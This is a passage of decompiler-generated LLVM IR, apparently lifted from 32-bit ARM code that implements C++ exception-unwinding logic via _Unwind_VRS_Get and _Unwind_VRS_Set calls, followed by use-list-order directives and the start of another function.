dec_label_pc_18658:                               ; preds = %dec_label_pc_18640
  store i32 %v1_18498, i32* %r2.global-to-local, align 4
  %v0_1865c = load i32, i32* @r7, align 4
  %v1_1865c = inttoptr i32 %v0_1865c to i32*
  %v2_1865c = load i32, i32* %v1_1865c, align 4
  %tmp206 = bitcast i32 %v2_1865c to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_18664 = bitcast float %tmp207 to i32
  store i32 %v1_18664, i32* @sl, align 4
  br i1 %v2_18594, label %dec_label_pc_1866c, label %dec_label_pc_187d8

dec_label_pc_1866c:                               ; preds = %dec_label_pc_18658
  %v2_1866c = icmp eq i32 %v0_18724, 0
  br i1 %v2_1866c, label %dec_label_pc_187c0, label %dec_label_pc_18674

dec_label_pc_18674:                               ; preds = %dec_label_pc_1866c
  %v2_18678 = icmp eq i32 %v1_18664, 0
  br i1 %v2_18678, label %dec_label_pc_18684.thread, label %bb159

dec_label_pc_18684.thread:                        ; preds = %dec_label_pc_18674
  br label %dec_label_pc_188e8

bb159:                                            ; preds = %dec_label_pc_18674
  br i1 %v3_1867c, label %dec_label_pc_1868c, label %dec_label_pc_187c0

dec_label_pc_1868c:                               ; preds = %bb159
  %v1_1868c = add i32 %v0_1865c, 4
  store i32 %v1_1868c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1869c = load i32, i32* @r8, align 4
  %v1_1869c = add i32 %v0_1869c, 88
  store i32 %v1_1869c, i32* %sb.global-to-local, align 4
  store i32 %v1_1868c, i32* @r4, align 4
  br label %dec_label_pc_186c0

dec_label_pc_186b0:                               ; preds = %bb161
  %v1_186b0 = add i32 %v0_186b0, 1
  store i32 %v1_186b0, i32* @r5, align 4
  %v1_186b4 = load i32, i32* @sl, align 4
  %v9_186b4 = icmp eq i32 %v1_186b0, %v1_186b4
  %v0_186b8 = load i32, i32* @r4, align 4
  %v1_186b8 = add i32 %v0_186b8, 4
  store i32 %v1_186b8, i32* @r4, align 4
  br i1 %v9_186b4, label %dec_label_pc_188e8, label %dec_label_pc_186b0.dec_label_pc_186c0_crit_edge

dec_label_pc_186b0.dec_label_pc_186c0_crit_edge:  ; preds = %dec_label_pc_186b0
  %v0_186cc.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_186c0

dec_label_pc_186c0:                               ; preds = %dec_label_pc_186b0.dec_label_pc_186c0_crit_edge, %dec_label_pc_1868c
  %v0_186cc = phi i32 [ %v0_186cc.pre, %dec_label_pc_186b0.dec_label_pc_186c0_crit_edge ], [ %v1_1869c, %dec_label_pc_1868c ]
  %v1_186d0 = phi i32 [ %v1_186b8, %dec_label_pc_186b0.dec_label_pc_186c0_crit_edge ], [ %v1_1868c, %dec_label_pc_1868c ]
  %v1_186c0 = inttoptr i32 %v1_186d0 to i32*
  %v2_186c0 = load i32, i32* %v1_186c0, align 4
  %v2_186c4 = icmp eq i32 %v2_186c0, 0
  store i32 %v0_186cc, i32* %forced_unwind_-44, align 4
  br i1 %v2_186c4, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_186c0
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_186c0, %bb160
  %v0_186d4 = load i32, i32* @r8, align 4
  store i32 %v0_186d4, i32* %r0.global-to-local, align 4
  store i32 %v2_18760, i32* %r2.global-to-local, align 4
  %v4_186e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 100) to i32*), align 4
  store i32 100080, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_186e4)
  %v0_186f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_186f0 = icmp eq i32 %v0_186f0, 0
  %v0_186b0 = load i32, i32* @r5, align 4
  br i1 %v2_186f0, label %dec_label_pc_186b0, label %dec_label_pc_186f8

dec_label_pc_186f8:                               ; preds = %bb161
  %v1_186f8 = load i32, i32* @sl, align 4
  %v9_186f8 = icmp eq i32 %v0_186b0, %v1_186f8
  br i1 %v9_186f8, label %dec_label_pc_188e8, label %dec_label_pc_18700

dec_label_pc_18700:                               ; preds = %dec_label_pc_186f8
  %v0_18700 = load i32, i32* @r7, align 4
  %v1_18700 = inttoptr i32 %v0_18700 to i32*
  %v2_18700 = load i32, i32* %v1_18700, align 4
  %v1_18704 = icmp slt i32 %v2_18700, 0
  %v0_1870c.pre = load i32, i32* @r6, align 4
  br i1 %v1_18704, label %dec_label_pc_1870c, label %dec_label_pc_187cc

dec_label_pc_1870c:                               ; preds = %dec_label_pc_18700, %dec_label_pc_187c4
  %v0_1870c = phi i32 [ %storemerge, %dec_label_pc_187c4 ], [ %v0_1870c.pre, %dec_label_pc_18700 ]
  store i32 %v0_1870c, i32* %r0.global-to-local, align 4
  %v1_18710 = add i32 %v0_1870c, 4
  store i32 %v1_18710, i32* @r6, align 4
  br label %dec_label_pc_187cc

dec_label_pc_18718:                               ; preds = %bb154
  store i32 %v1_18498, i32* %r2.global-to-local, align 4
  br i1 %v2_18594, label %dec_label_pc_18724, label %dec_label_pc_18810

dec_label_pc_18724:                               ; preds = %dec_label_pc_18718
  %v2_18724 = icmp eq i32 %v0_18724, 0
  br i1 %v2_18724, label %dec_label_pc_18790, label %dec_label_pc_1872c

dec_label_pc_1872c:                               ; preds = %dec_label_pc_18724
  %v0_1872c = load i32, i32* @r7, align 4
  %v1_1872c = add i32 %v0_1872c, 4
  %v2_1872c = inttoptr i32 %v1_1872c to i32*
  %v3_1872c = load i32, i32* %v2_1872c, align 4
  %v7_18730 = icmp eq i32 %v3_1872c, -2
  store i32 %v1_1872c, i32* %r2.global-to-local, align 4
  br i1 %v7_18730, label %dec_label_pc_18648, label %dec_label_pc_1873c

dec_label_pc_1873c:                               ; preds = %dec_label_pc_1872c
  %v0_1873c = load i32, i32* @r8, align 4
  %v1_1873c = add i32 %v0_1873c, 88
  %v7_18740 = icmp eq i32 %v3_1872c, -1
  store i32 %v1_1873c, i32* %forced_unwind_-44, align 4
  br i1 %v7_18740, label %dec_label_pc_18784, label %dec_label_pc_1874c

dec_label_pc_1874c:                               ; preds = %dec_label_pc_1873c
  %v2_18750 = icmp eq i32 %v3_1872c, 0
  br i1 %v2_18750, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_1874c
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_1874c, %bb162
  store i32 %v0_1873c, i32* %r0.global-to-local, align 4
  store i32 %v2_18760, i32* %r2.global-to-local, align 4
  %v4_1876c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 100) to i32*), align 4
  store i32 100216, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1876c)
  %v0_18778 = load i32, i32* %r0.global-to-local, align 4
  %v2_18778 = icmp eq i32 %v0_18778, 0
  br i1 %v2_18778, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_18784.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18784

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18790

dec_label_pc_18784:                               ; preds = %.thread25, %dec_label_pc_1873c
  %v3_18784 = phi i32 [ %v3_18784.pr, %.thread25 ], [ %v1_1873c, %dec_label_pc_1873c ]
  %v2_18788 = icmp eq i32 %v3_18784, 0
  br i1 %v2_18788, label %dec_label_pc_18790, label %dec_label_pc_188e8

dec_label_pc_18790:                               ; preds = %bb164, %dec_label_pc_1883c, %dec_label_pc_18810, %dec_label_pc_18784, %dec_label_pc_18724
  %v0_18790 = load i32, i32* @r7, align 4
  %v1_18790 = add i32 %v0_18790, 8
  %v1_184f8 = inttoptr i32 %v1_18790 to i32*
  %v2_184f8 = load i32, i32* %v1_184f8, align 4
  %v2_184fc = icmp eq i32 %v2_184f8, 0
  br i1 %v2_184fc, label %dec_label_pc_185b8, label %dec_label_pc_18504.preheader

dec_label_pc_18798:                               ; preds = %entry
  %v3_18798 = udiv i32 %v2_1848c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_187a8 = mul nuw nsw i32 %v3_18798, 4
  %v3_187ac = mul i32 %v2_1848c, 65536
  %v2_187b0 = add i32 %v6_187a8, %v4_1848c
  store i32 %v3_187ac, i32* %v4_184ac, align 8
  br label %dec_label_pc_184d4

dec_label_pc_187c0:                               ; preds = %bb159, %dec_label_pc_1866c
  %v1_187c0 = add i32 %v0_1865c, 4
  br label %dec_label_pc_187c4

dec_label_pc_187c4:                               ; preds = %dec_label_pc_18804, %dec_label_pc_187c0
  %v0_187c4 = phi i32 [ %v2_18804, %dec_label_pc_18804 ], [ %v2_1865c, %dec_label_pc_187c0 ]
  %storemerge = phi i32 [ %v4_18804, %dec_label_pc_18804 ], [ %v1_187c0, %dec_label_pc_187c0 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_187c4 = icmp slt i32 %v0_187c4, 0
  br i1 %v1_187c4, label %dec_label_pc_1870c, label %dec_label_pc_187cc

dec_label_pc_187cc:                               ; preds = %dec_label_pc_18700, %dec_label_pc_187c4, %dec_label_pc_188d8, %dec_label_pc_1870c
  %v0_187d0 = phi i32 [ %v1_18710, %dec_label_pc_1870c ], [ %storemerge, %dec_label_pc_187c4 ], [ %v1_188dc, %dec_label_pc_188d8 ], [ %v0_1870c.pre, %dec_label_pc_18700 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_1870c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_187c4 ], [ %v1_188d8, %dec_label_pc_188d8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18700 ]
  %v0_187cc = load i32, i32* @sl, align 4
  %v3_187cc = mul i32 %v0_187cc, 4
  %v2_187d0 = add i32 %v3_187cc, %v0_187d0
  %v1_184f865 = inttoptr i32 %v2_187d0 to i32*
  %v2_184f866 = load i32, i32* %v1_184f865, align 4
  %v2_184fc68 = icmp eq i32 %v2_184f866, 0
  br i1 %v2_184fc68, label %dec_label_pc_185b8, label %dec_label_pc_18504.preheader.lr.ph

dec_label_pc_187d8:                               ; preds = %dec_label_pc_18658
  %v0_187e8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_187e8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_187f0 = load i32, i32* @r8, align 4
  %v1_187f0 = add i32 %v0_187f0, 32
  %v2_187f0 = inttoptr i32 %v1_187f0 to i32*
  %v3_187f0 = load i32, i32* %v2_187f0, align 4
  store i32 %v3_187f0, i32* @r4, align 4
  %v5_187f4 = call i32 @_Unwind_VRS_Get(i32 %v0_187e8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_187f4, i32* %r0.global-to-local, align 4
  %v3_187f8 = load i32, i32* %stack_var_-48, align 4
  %v0_187fc = load i32, i32* @r4, align 4
  %v9_187fc = icmp eq i32 %v0_187fc, %v3_187f8
  br i1 %v9_187fc, label %dec_label_pc_188a4, label %dec_label_pc_187d8.dec_label_pc_18804_crit_edge

dec_label_pc_187d8.dec_label_pc_18804_crit_edge:  ; preds = %dec_label_pc_187d8
  %v0_18804.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18804

dec_label_pc_18804:                               ; preds = %dec_label_pc_187d8.dec_label_pc_18804_crit_edge, %dec_label_pc_188a4
  %v0_18804 = phi i32 [ %v0_18804.pre, %dec_label_pc_187d8.dec_label_pc_18804_crit_edge ], [ %v1_188a8, %dec_label_pc_188a4 ]
  %v1_18804 = inttoptr i32 %v0_18804 to i32*
  %v2_18804 = load i32, i32* %v1_18804, align 4
  %v4_18804 = add i32 %v0_18804, 4
  store i32 %v4_18804, i32* @r7, align 4
  br label %dec_label_pc_187c4

dec_label_pc_18810:                               ; preds = %dec_label_pc_18718
  %v0_18820 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18820, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18828 = load i32, i32* @r8, align 4
  %v1_18828 = add i32 %v0_18828, 32
  %v2_18828 = inttoptr i32 %v1_18828 to i32*
  %v3_18828 = load i32, i32* %v2_18828, align 4
  store i32 %v3_18828, i32* @r4, align 4
  %v5_1882c = call i32 @_Unwind_VRS_Get(i32 %v0_18820, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1882c, i32* %r0.global-to-local, align 4
  %v3_18830 = load i32, i32* %stack_var_-48, align 4
  %v0_18834 = load i32, i32* @r4, align 4
  %v9_18834 = icmp eq i32 %v0_18834, %v3_18830
  br i1 %v9_18834, label %dec_label_pc_1883c, label %dec_label_pc_18790

dec_label_pc_1883c:                               ; preds = %dec_label_pc_18810
  %v0_1883c = load i32, i32* @r8, align 4
  %v1_1883c = add i32 %v0_1883c, 40
  %v2_1883c = inttoptr i32 %v1_1883c to i32*
  %v3_1883c = load i32, i32* %v2_1883c, align 4
  %v1_18840 = load i32, i32* @r7, align 4
  %v9_18840 = icmp eq i32 %v3_1883c, %v1_18840
  br i1 %v9_18840, label %dec_label_pc_18848, label %dec_label_pc_18790

dec_label_pc_18848:                               ; preds = %dec_label_pc_1883c
  %v1_18848 = inttoptr i32 %v3_1883c to i32*
  %v2_18848 = load i32, i32* %v1_18848, align 4
  %v1_1884c = and i32 %v2_18848, 1073741824
  %v2_1884c = icmp eq i32 %v1_1884c, 0
  br i1 %v2_1884c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_18848
  %v2_18850 = or i32 %v2_18848, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_18848
  %tmp208 = bitcast i32 %v2_18848 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_18854 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_18858 = phi i32 [ %v2_18988, %.thread28 ], [ %v2_18988, %bb169 ], [ %v3_1883c, %bb165 ], [ %v3_1883c, %.thread26 ]
  %v0_18858 = phi i32 [ %v2_18998, %.thread28 ], [ %v2_18994, %bb169 ], [ %v2_18850, %bb165 ], [ %v2_18854, %.thread26 ]
  %v2_18858 = add i32 %v0_18858, %v1_18858
  store i32 %v2_18858, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18870 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18870, i32* %r0.global-to-local, align 4
  %v5_18878 = call i32 @_Unwind_VRS_Set(i32 %v0_18870, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_18870, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18890 = load i32, i32* @r8, align 4
  store i32 %v0_18890, i32* %stack_var_-48, align 4
  %v5_18898 = call i32 @_Unwind_VRS_Set(i32 %v0_18870, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1864c

dec_label_pc_188a4:                               ; preds = %dec_label_pc_187d8
  %v0_188a4 = load i32, i32* @r8, align 4
  %v1_188a4 = add i32 %v0_188a4, 40
  %v2_188a4 = inttoptr i32 %v1_188a4 to i32*
  %v3_188a4 = load i32, i32* %v2_188a4, align 4
  %v1_188a8 = load i32, i32* @r7, align 4
  %v9_188a8 = icmp eq i32 %v3_188a4, %v1_188a8
  br i1 %v9_188a8, label %dec_label_pc_188b0, label %dec_label_pc_18804

dec_label_pc_188b0:                               ; preds = %dec_label_pc_188a4
  %v1_188b4 = add i32 %v3_188a4, 4
  store i32 %v1_188b4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_188bc = add i32 %v0_188a4, 44
  %v3_188bc = inttoptr i32 %v2_188bc to i32*
  store i32 0, i32* %v3_188bc, align 4
  %v0_188c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_188c0 = load i32, i32* @r8, align 4
  %v2_188c0 = add i32 %v1_188c0, 48
  %v3_188c0 = inttoptr i32 %v2_188c0 to i32*
  store i32 %v0_188c0, i32* %v3_188c0, align 4
  %v0_188c4 = load i32, i32* @sl, align 4
  %v1_188c4 = load i32, i32* @r8, align 4
  %v2_188c4 = add i32 %v1_188c4, 40
  %v3_188c4 = inttoptr i32 %v2_188c4 to i32*
  store i32 %v0_188c4, i32* %v3_188c4, align 4
  %v0_188c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_188c8 = load i32, i32* @r8, align 4
  %v2_188c8 = add i32 %v1_188c8, 52
  %v3_188c8 = inttoptr i32 %v2_188c8 to i32*
  store i32 %v0_188c8, i32* %v3_188c8, align 4
  %v0_188cc = load i32, i32* @r7, align 4
  %v1_188cc = inttoptr i32 %v0_188cc to i32*
  %v2_188cc = load i32, i32* %v1_188cc, align 4
  %v1_188d0 = icmp slt i32 %v2_188cc, 0
  br i1 %v1_188d0, label %dec_label_pc_188d8, label %dec_label_pc_18984

dec_label_pc_188d8:                               ; preds = %dec_label_pc_188b0
  %v0_188d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_188d8 = add i32 %v0_188d8, -3
  store i32 %v1_188d8, i32* %r2.global-to-local, align 4
  %v0_188dc = load i32, i32* %r0.global-to-local, align 4
  %v1_188dc = add i32 %v0_188dc, 4
  store i32 %v1_188dc, i32* @r6, align 4
  br label %dec_label_pc_187cc

dec_label_pc_188e8:                               ; preds = %dec_label_pc_186f8, %dec_label_pc_18784, %dec_label_pc_186b0, %dec_label_pc_18684.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_188f8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_188f8, i32* %r0.global-to-local, align 4
  %v5_18900 = call i32 @_Unwind_VRS_Get(i32 %v0_188f8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18904 = load i32, i32* @r7, align 4
  %v1_18904 = load i32, i32* @r8, align 4
  %v2_18904 = add i32 %v1_18904, 40
  %v3_18904 = inttoptr i32 %v2_18904 to i32*
  store i32 %v0_18904, i32* %v3_18904, align 4
  %v3_18908 = load i32, i32* %stack_var_-48, align 4
  %v3_1890c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_1890c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_18914 = load i32, i32* @r8, align 4
  %v2_18914 = add i32 %v1_18914, 32
  %v3_18914 = inttoptr i32 %v2_18914 to i32*
  store i32 %v3_18908, i32* %v3_18914, align 4
  %v0_18918 = load i32, i32* %r2.global-to-local, align 4
  %v1_18918 = load i32, i32* @r8, align 4
  %v2_18918 = add i32 %v1_18918, 36
  %v3_18918 = inttoptr i32 %v2_18918 to i32*
  store i32 %v0_18918, i32* %v3_18918, align 4
  %v1_18654.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1864c

dec_label_pc_18920:                               ; preds = %bb155
  %v1_18920 = inttoptr i32 %v0_185a8 to i32*
  %v2_18920 = load i32, i32* %v1_18920, align 4
  %v1_18924 = add i32 %v0_185a8, 4
  %v1_18928 = and i32 %v2_18920, 1073741824
  %v2_18928 = icmp eq i32 %v1_18928, 0
  %v2_1892c = or i32 %v2_18920, -2147483648
  %tmp210 = bitcast i32 %v2_18920 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_18930 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_18928, i32 %v2_18930, i32 %v2_1892c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_18934 = load i32, i32* @r8, align 4
  %v2_18934 = add i32 %v1_18934, 56
  %v3_18934 = inttoptr i32 %v2_18934 to i32*
  store i32 %v1_18924, i32* %v3_18934, align 4
  %v0_18938 = load i32, i32* @r8, align 4
  store i32 %v0_18938, i32* %r0.global-to-local, align 4
  %v4_18944 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 28) to i32*), align 4
  store i32 100688, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18944)
  %v0_18950 = load i32, i32* %r0.global-to-local, align 4
  %v2_18950 = icmp eq i32 %v0_18950, 0
  br i1 %v2_18950, label %dec_label_pc_18648, label %dec_label_pc_18958

dec_label_pc_18958:                               ; preds = %dec_label_pc_18920
  %v0_18958 = load i32, i32* %r4.global-to-local, align 4
  %v1_18958 = load i32, i32* @r7, align 4
  %v2_18958 = add i32 %v1_18958, %v0_18958
  store i32 %v2_18958, i32* %stack_var_-48, align 4
  %v0_18968 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18968, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_18978 = call i32 @_Unwind_VRS_Set(i32 %v0_18968, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1864c

dec_label_pc_18984:                               ; preds = %dec_label_pc_188b0
  %v0_18984 = load i32, i32* @sl, align 4
  %v3_18984 = mul i32 %v0_18984, 4
  %v0_18988 = load i32, i32* %r0.global-to-local, align 4
  %v2_18988 = add i32 %v0_18988, %v3_18984
  %v3_18988 = inttoptr i32 %v2_18988 to i32*
  %v4_18988 = load i32, i32* %v3_18988, align 4
  %v1_1898c = and i32 %v4_18988, 1073741824
  %v2_1898c = icmp eq i32 %v1_1898c, 0
  br i1 %v2_1898c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_18984
  %v2_18994 = or i32 %v4_18988, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_18984
  %tmp212 = bitcast i32 %v4_18988 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_18998 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_18988, { 2, 1, 0 }
  uselistorder i32 %v1_188dc, { 1, 0 }
  uselistorder i32 %v1_188d8, { 1, 0 }
  uselistorder i32 %v1_188a8, { 1, 0 }
  uselistorder i32 %v0_18870, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1883c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18804, { 1, 0 }
  uselistorder i32 %v0_18804, { 1, 0 }
  uselistorder i32 %v2_184f866, { 1, 0 }
  uselistorder i32 %v2_187d0, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_184f8, { 1, 0 }
  uselistorder i32 %v1_18790, { 1, 0 }
  uselistorder i32 %v3_1872c, { 2, 0, 1 }
  uselistorder i32 %v0_1870c, { 1, 0 }
  uselistorder i32 %v0_1870c.pre, { 1, 0 }
  uselistorder i32 %v1_18664, { 1, 0 }
  uselistorder i32 %v2_1865c, { 1, 0 }
  uselistorder i32 %v0_185ec, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_185ac, { 1, 0 }
  uselistorder i32 %v1_185a8, { 1, 0 }
  uselistorder i32 %v0_185a8, { 1, 0, 2 }
  uselistorder i32 %v4_18580, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18724, { 1, 2, 0 }
  uselistorder i32 %v0_18558, { 1, 0 }
  uselistorder i32 %v3_18554, { 1, 0, 2 }
  uselistorder i32 %v1_18528, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_18760, { 1, 0 }
  uselistorder i1 %v2_18594, { 1, 0, 2 }
  uselistorder i32 %v1_18498, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 15, 16, 17, 18, 19, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 20, 17, 18, 19, 24, 25, 26, 27, 29, 28, 31, 30, 32, 33, 35, 34, 23, 21, 22, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 6, 5, 9 }
  uselistorder i32 6, { 77, 0, 15, 16, 76, 4, 32, 33, 18, 28, 19, 29, 20, 30, 17, 31, 2, 34, 21, 35, 1, 5, 36, 37, 38, 6, 39, 40, 41, 42, 7, 43, 44, 45, 46, 8, 47, 9, 48, 49, 22, 50, 10, 51, 52, 53, 23, 54, 11, 55, 56, 57, 24, 58, 59, 60, 25, 61, 12, 62, 63, 64, 65, 26, 66, 13, 67, 68, 69, 70, 71, 72, 27, 73, 14, 74, 3, 75 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 23, 1, 2, 5, 12, 13, 9, 10, 11, 14, 16, 15, 6, 18, 19, 3, 20, 0, 21, 22, 7, 8, 17, 4 }
  uselistorder i32 48, { 17, 2, 0, 6, 4, 5, 9, 10, 7, 8, 14, 15, 16, 11, 12, 3, 13, 1 }
  uselistorder i32 44, { 41, 3, 42, 43, 1, 14, 4, 15, 5, 6, 7, 25, 26, 27, 28, 29, 30, 22, 23, 24, 8, 20, 21, 9, 2, 10, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 11, 12, 13, 0, 16, 17, 18, 19 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 145, 28, 29, 150, 144, 149, 30, 31, 32, 33, 34, 35, 36, 143, 37, 38, 39, 2, 40, 0, 3, 41, 42, 44, 43, 1, 47, 45, 46, 48, 53, 49, 54, 50, 55, 51, 52, 56, 57, 58, 59, 61, 62, 60, 142, 64, 63, 67, 68, 69, 65, 66, 72, 70, 73, 71, 74, 75, 76, 77, 78, 80, 81, 79, 82, 146, 84, 83, 87, 88, 89, 85, 86, 90, 91, 93, 94, 95, 92, 96, 147, 97, 99, 98, 101, 100, 102, 148, 103, 105, 104, 107, 106, 109, 110, 108, 111, 112, 119, 113, 120, 114, 121, 115, 122, 116, 123, 117, 118, 125, 124, 126, 127, 128, 129, 134, 130, 135, 131, 136, 132, 133, 138, 137, 139, 140, 141 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_219e0.355 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 114, 32, 76, 115, 81 }
  uselistorder i32 -2, { 0, 30, 31, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 26, 25, 27, 28, 29, 18, 19, 20, 21, 22, 23, 24, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 80, { 10, 11, 12, 0, 2, 1, 3, 4, 5, 8, 6, 7, 9 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_188e8, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18804, { 1, 0 }
  uselistorder label %dec_label_pc_187cc, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18790, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_1870c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_1864c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_18648, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_185a8, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_18504, { 1, 0 }
  uselistorder label %dec_label_pc_18504.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18504.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_189a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_189a4:
  %v0_189a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_189a4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_189a4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_189a4, %bb
